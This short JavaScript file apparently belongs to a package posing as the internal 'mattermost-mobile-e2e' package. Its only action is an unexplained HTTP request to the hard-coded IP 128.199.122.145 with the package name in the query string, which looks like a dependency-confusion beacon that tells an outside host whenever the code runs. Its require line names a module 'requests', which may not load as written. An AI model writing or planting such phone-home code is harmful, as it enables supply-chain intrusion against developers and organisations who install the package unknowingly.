const request = require("requests")

let host = "128.199.122.145"
let packages = "mattermost-mobile-e2e"

request(`http://${host}/?${packages}`, (error, response, body) => {})